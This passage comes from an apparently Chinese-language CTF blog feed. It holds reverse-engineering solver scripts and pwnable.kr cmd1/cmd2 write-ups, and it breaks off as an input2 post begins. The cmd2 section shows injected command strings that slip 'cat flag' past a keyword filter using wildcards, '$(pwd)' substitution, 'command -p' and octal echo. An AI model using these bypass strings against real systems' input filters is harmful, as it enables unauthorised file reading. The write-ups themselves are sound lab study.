class="number">1</span>,len(res)):</span><br><span class="line">        res[i] = res[i] ^ ord(key[(i)%<span class="number">4</span>]) ^ res[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># [147, 113, 155, 170, 250, 251, 105, 139, 179, 145, 154, 170, 251, 147, 66, 17, 115, 105, 129, 155, 18, 98, 251, 113, 129, 131, 34, 251, 113, 131, 107, 59]</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 位运算脚本</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    BYTE byte[] = &#123; <span class="number">147</span>, <span class="number">113</span>, <span class="number">155</span>, <span class="number">170</span>, <span class="number">250</span>, <span class="number">251</span>, <span class="number">105</span>, <span class="number">139</span>, <span class="number">179</span>, <span class="number">145</span>, <span class="number">154</span>, <span class="number">170</span>, <span class="number">251</span>, <span class="number">147</span>, <span class="number">66</span>, <span class="number">17</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">129</span>, <span class="number">155</span>, <span class="number">18</span>, <span class="number">98</span>, <span class="number">251</span>, <span class="number">113</span>, <span class="number">129</span>, <span class="number">131</span>, <span class="number">34</span>, <span class="number">251</span>, <span class="number">113</span>, <span class="number">131</span>, <span class="number">107</span>, <span class="number">59</span> &#125;;</span><br><span class="line">    BYTE index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> first = byte[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (<span class="number">147</span> &gt;&gt;<span class="number">3</span>)&amp;<span class="number">0xFF</span> | (<span class="number">59</span> &lt;&lt;<span class="number">5</span>)&amp;<span class="number">0xFF</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">31</span>; i++) &#123;</span><br><span class="line">        BYTE x = (byte[i] &lt;&lt; <span class="number">5</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        BYTE y = (byte[i + <span class="number">1</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, x | y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// rn3u__m1vr3U_rhB.m03bL_n00d_n0mg</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 交换位置</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Change</span>():</span></span><br><span class="line">    flag = list(<span class="string">&#x27;rn3u__m1vr3U_rhB.m03bL_n00d_n0mg&#x27;</span>)</span><br><span class="line">    index = []</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        num += <span class="number">0x11</span></span><br><span class="line">        num &amp;= <span class="number">0x1F</span></span><br><span class="line">        index.append(num)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">32</span>,<span class="number">2</span>):</span><br><span class="line">        flag[index[i]], flag[index[i+<span class="number">1</span>]] = flag[index[i+<span class="number">1</span>]], flag[index[i]]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">        print(flag[i],end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><em>flag: B0mb3_L0nd0n_m0rg3n_um_v13r_Uhr.</em></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>​        这道题过程不复杂，调用了SetUnhandledExceptionFilter，注册异常处理函数，通过C7这个非法指令触发异常，运行这个异常处理函数，从而进行加密操作</p><p>​        如果想动态调试的话可以直接改字节码（我只会这一种方法。。）不知道还有没有其他方法，但是做题的时候需要细心一点，因为汇编的一些过程没有看清导致浪费了我很多时间</p><h3 id="obfu"><a href="#obfu" class="headerlink" title="obfu"></a>obfu</h3><p>我搞得最烦的一道题。。以前没有搞过带iv的AES，也从来没有看过sha256和md5的反编译代码，这次算是遇到了。。看了很久都没有看出来，最后看了别的师傅的wp才出来的。其实这道题知道了md5和sha256之后加密过程并不复杂，但是如果是第一次遇到那就恼火了（比如像我）</p><p>总共算下来这道题一共有5个步骤</p><ol><li><p>字符串转16进制</p><p>打个比方：比如我们输入123456，那么程序会将我们输入的转为 12 23 45这三个16进制数进行保存，因此前面只允许输入0-9 a-f的字符</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210205003234483.png" alt="image-20210205003234483"></p></li><li><p>位运算</p><p>总体向前移动了三位（我怀疑这次的题是一个人出的，加密算法都好相似。。）</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210205003456605.png"></p></li><li><p>计算key和iv</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210205003652039.png"></p></li><li><p>rc4和AES</p><p>注意AES是解密，题目用的是Res盒子，并不是常规的S盒子，所以我们写脚本的时候是加密</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210205004416149.png"></p></li></ol><p>5.与用md5生成的序列比较</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210205004520967.png"></p><p>如果序列号比对成功，程序就会读取flag.enc中的二进制数据，我们输入然后通过加密计算得到的序列号就会作为key解密flag.enc的二进制数据流，同样也是AES CBC模式，但是这部分不用我们关心，我们只需要得到正确的序列号就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> AES,ARC4</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">string = <span class="string">b&#x27;admin&#x27;</span></span><br><span class="line">new_res = [<span class="number">0x8c</span>]</span><br><span class="line"></span><br><span class="line">Plain_AES = binascii.unhexlify(hashlib.md5(string).hexdigest())</span><br><span class="line">digest = hashlib.sha256(string).hexdigest()</span><br><span class="line"></span><br><span class="line">res = [i <span class="keyword">for</span> i <span class="keyword">in</span> binascii.unhexlify(digest)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">32</span>):</span><br><span class="line">    new_res.append(res[i] ^ res[i - <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># aes加密</span></span><br><span class="line">key = binascii.a2b_hex((bytes(new_res).hex()[:<span class="number">32</span>]).encode())</span><br><span class="line">iv = binascii.a2b_hex((bytes(new_res).hex()[<span class="number">32</span>:]).encode())</span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">Cipher_AES = aes.encrypt(Plain_AES)</span><br><span class="line"></span><br><span class="line"><span class="comment"># rc4加密</span></span><br><span class="line">rc4_cipher = Cipher_AES</span><br><span class="line">rc4 = ARC4.new(key)</span><br><span class="line">rc4_plain = rc4.decrypt(rc4_cipher)</span><br><span class="line">print(rc4_plain)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 位运算</span></span><br><span class="line">big_num_hex = binascii.hexlify(rc4_plain)</span><br><span class="line">big_num_bin = bin(int(big_num_hex, <span class="number">16</span>))[<span class="number">2</span>:].rjust(<span class="number">16</span>*<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">big_num_bin = big_num_bin[<span class="number">3</span>:] + big_num_bin[:<span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    flag += hex(int(big_num_bin[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>],<span class="number">2</span>))[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 653b987431e5a2fc7c3d748fba008869</span></span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210205005157181.png"></p><h3 id="复现总结"><a href="#复现总结" class="headerlink" title="复现总结"></a>复现总结</h3><ol><li>常见的加密算法特征不清楚（大问题）</li><li>看汇编不仔细（需要改掉自己粗心的毛病）</li><li>windows方面知识还是不够</li><li>题型见得太少了，感觉做了一道题就累的要死😑，真的佩服比赛从开始肝到最后的师傅们</li><li>学习了怎么使用Cryptdome库，windows的几种反调试（异常注册，debug bloker)，下次在遇到就不会这么痛苦了吧（大概）</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h3 id=&quot;babyre&quot;&gt;&lt;a href=&quot;#babyre&quot; class=&quot;headerlink&quot; title=&quot;babyre&quot;&gt;&lt;/a&gt;babyre&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://f1sh-blog.oss-cn-</summary>
      
    
    
    
    
    <category term="re" scheme="http://example.com/tags/re/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr cmd1 cmd2</title>
    <link href="http://example.com/2021/01/31/CTF/pwn/pwnable/pwnable.kr%20cmd1%20cmd2/"/>
    <id>http://example.com/2021/01/31/CTF/pwn/pwnable/pwnable.kr%20cmd1%20cmd2/</id>
    <published>2021-01-31T08:35:25.563Z</published>
    <updated>2021-02-05T06:33:30.279Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h3 id="cmd1"><a href="#cmd1" class="headerlink" title="cmd1"></a>cmd1</h3><p><a href="http://c.biancheng.net/view/5876.html">linuxPATH入门教学</a><br><a href="https://blog.csdn.net/qq_16334327/article/details/96591949">linux命令通配符</a><br><a href="https://blog.csdn.net/shisiye15/article/details/7846557">putenv函数讲解</a></p><p>这道题考察的是对于linux中shell的操作，还有PATH环境知识的理解。我参考了上面三篇文章，都写得很不错👍。这里我写两种解决方法</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201203616211.png"></p><h4 id="method-1"><a href="#method-1" class="headerlink" title="method 1"></a>method 1</h4><p>首先ssh登录，查看源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;flag&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;sh&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;tmp&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">        putenv(<span class="string">&quot;PATH=/thankyouverymuch&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,getenv(<span class="string">&quot;PATH&quot;</span>));</span><br><span class="line">        system(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        system( argv[<span class="number">1</span>] );</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序将PATH环境设置成了一个不存在的路径导致不能直接使用命令，而且filter函数过滤掉了我们输入的一些字符。</p><p>这里我们可以先来测试一下PATH如果被改变会怎么样，下面贴测试代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>**argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//打印改变前的PATH，并且使用命令</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;before PATH: %s\n&quot;</span>,getenv(<span class="string">&quot;PATH&quot;</span>));</span><br><span class="line">        system(argv[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//改变PATH，将其设置成一个不存在的路径</span></span><br><span class="line">        putenv(<span class="string">&quot;PATH=/aaa&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//再次打印路径</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;after PATH: %s\n&quot;</span>, getenv(<span class="string">&quot;PATH&quot;</span>));</span><br><span class="line">        system(argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后运行，这里我们测试的命令是 <strong>ls</strong> ，可以发现ls命令已经失效了，由于PATH的路径被临时改变，需要使用ls命令的绝对路径 <strong>/bin/ls</strong></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201204940643.png"></p><p>再次测试，使用命令的绝对路径 <strong>/bin/ls</strong>，可以发现又可以正常运行了</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201205043930.png" alt="image-20210201205043930"></p><p>所以这道题我们需要输入<strong>cat</strong>命令的绝对路径 <strong>/bin/cat</strong>，但是问题又来了，flag这个词被过滤掉了，这就需要使用到统配符了，我们可以使用 <strong>“/bin/cat f*“</strong> 或者 <strong>“/bin/cat fla?”</strong> 等命令来实现查看flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./cmd1 &#x27;/bin/cat fla?&#x27;</span><br><span class="line">./cmd1 &#x27;/bin/cat f*&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201205526147.png"></p><p><em>mommy now I get what PATH environment is for :)</em></p><h4 id="method-2"><a href="#method-2" class="headerlink" title="method 2"></a>method 2</h4><p>第二种方法是我们采用shell编程方式，先创建一个文件，在利用程序打开我们的文件，在文件中，我们可以使用任意字符而不受限制</p><ul><li><p>首先现在服务器的/tmp/目录下创建一个我们自己使用的目录，然后在目录中创建我们的文件，一会儿需要用程序来调用</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201210815614.png"></p></li><li><p>在创建bash文件，文件名字里面千万不能带有过滤字符（我踩了这个坑😥），然后写入命令</p></li></ul><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201212309793.png"></p><ul><li>让程序调用文件，一样可以达到效果</li></ul><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201212435273.png"></p><h3 id="cmd2"><a href="#cmd2" class="headerlink" title="cmd2"></a>cmd2</h3><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201212556897.png"></p><p>cmd2的考点与cmd1大同小异，只是这一次源码中过滤了更多的字符，需要更高的技巧才能绕过字符过滤检测拿到flag，下面贴源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;=&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;PATH&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;export&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;/&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;`&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;flag&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_env</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span>** p;</span><br><span class="line">        <span class="keyword">for</span>(p=environ; *p; p++) <span class="built_in">memset</span>(*p, <span class="number">0</span>, <span class="built_in">strlen</span>(*p));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">        delete_env();</span><br><span class="line">        putenv(<span class="string">&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">        system( argv[<span class="number">1</span>] );</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这次程序直接过滤了’/‘,’.’之类的符号，连路径都不让使用💔 下面我提供几种种方法（网上看到总结的，学习一手）</p><h4 id="利用pwd"><a href="#利用pwd" class="headerlink" title="利用pwd"></a>利用pwd</h4><p>利用$，我们可以进入到根目录，用$(pwd)来代替’/‘</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202002742365.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /</span><br><span class="line">/home/cmd2/cmd2 &#x27;$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f*&#x27;</span><br><span class="line">/home/cmd2/cmd2 &quot;\$(pwd)bin\$(pwd)cat \$(pwd)home\$(pwd)cmd2\$(pwd)f*&quot;</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202001835043.png"></p><p>上面两种写法都可以，这是linux中双引号和单引号的区别，下面这篇文章可以了解他们之间的区别</p><p><a href="https://blog.csdn.net/u014636245/article/details/82919144">Linux中单引号双引号的区别与用法</a></p><h4 id="command-p"><a href="#command-p" class="headerlink" title="command -p"></a>command -p</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;command -p&#x27; //这条命令会强制将环境变为默认值，就不用使用绝对路径</span><br><span class="line">./cmd2 &#x27;command -p cat f*&#x27;</span><br></pre></td></tr></table></figure><h4 id="echo解析8进制与16进制"><a href="#echo解析8进制与16进制" class="headerlink" title="echo解析8进制与16进制"></a>echo解析8进制与16进制</h4><p>在网上看别人wp学的其实我觉得原理和第一个差不太多，这个是利用echo可以解析16进制和8进制表示的字符串（但是不能用参数 -e），具体情况要看系统版本。（我在网上看到他们在远程服务器上echo命令可以解释8进制，但我试了试就不行，还是记录下这个方法）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将 /bin/cat flag 转化为8进制</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">cmd = <span class="string">&quot;/bin/cat flag&quot;</span></span><br><span class="line">print(<span class="string">&quot;\\&quot;</span>+<span class="string">&quot;\\&quot;</span>.join([oct(i) <span class="keyword">for</span> i <span class="keyword">in</span> ordlist(cmd)]))</span><br><span class="line"><span class="comment"># \057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cmd2 &#x27;$(echo &quot;\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>我的本地虚拟机就不可以直接用echo命令转，需要参数-e</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202000852202.png"></p><h4 id="set-s"><a href="#set-s" class="headerlink" title="set -s"></a>set -s</h4><p>具体的原理还没有在网上找到，等后面补充</p><p><a href="http://www.ruanyifeng.com/blog/2017/11/bash-set.html">Bash 脚本 set 命令教程</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./cmd2 &#x27;set -s&#x27;</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">/bin/cat flag</span></span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li><p>shell编程点都不会，其实上学期学了的，只是上网课一点都没有认真听。。想在想起来有点傻，后面需要补习下shell的知识</p></li><li><p>linux的东西太灵活了。。其实上面的两道题还有几种其他的方法，但是我精力和时间有限，只收集了几种我感觉还可以的方法</p></li><li><p>我太菜了。。🐹</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h3 id=&quot;cmd1&quot;&gt;&lt;a href=&quot;#cmd1&quot; class=&quot;headerlink&quot; title=&quot;cmd1&quot;&gt;&lt;/a&gt;cmd1&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://c.biancheng.net/view/5876.h</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="pwn" scheme="http://example.com/categories/CTF/pwn/"/>
    
    <category term="pwnable.kr" scheme="http://example.com/categories/CTF/pwn/pwnable-kr/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="wp" scheme="http://example.com/tags/wp/"/>
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr input2</title>
    <link href="http://example.com/2021/01/30/CTF/pwn/pwnable/pwnable.kr-input2/"/>
    <id>http://example.com/2021/01/30/CTF/pwn/pwnable/pwnable.kr-input2/</id>
    <published>2021-01-30T15:55:25.870Z</published>
    <updated>2021-02-08T05:15:37.744Z</updated>
    
    <content type="html"><![CDATA[<h4 id="read函数"><a href="#read函数" class="headerlink" title="read函数"></a>read函数</h4><p>从文件描述符指向的管道口读入指定字节的字符串到指定的数组中</p><h4 id="write函数"><a href="#write函数" class="headerlink" title="write函数"></a>write函数</h4><p>从指定的数组中写入指定数量的字节到指定的文件描述符指向的管道口</p><p>常见的 三种 0， 1， 2 分别表示标准输入，标准输入，标准错误</p><h4 id="pipe函数"><a href="#pipe函数" class="headerlink" title="pipe函数"></a>pipe函数</h4><h4 id="dup-amp-dup2函数"><a href="#dup-amp-dup2函数" class="headerlink" title="dup&amp;dup2函数"></a>dup&amp;dup2函数</h4><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/20170503111155611.jpg"></p><p>复制一份相同的文件描述符</p><h4 id="fork函数"><a href="#fork函数" class="headerlink" title="fork函数"></a>fork函数</h4><p>在当前父进程创建一个子进程，子进程返回得fpid == 0</p><h4 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h4><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210124163916045.png"></p><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 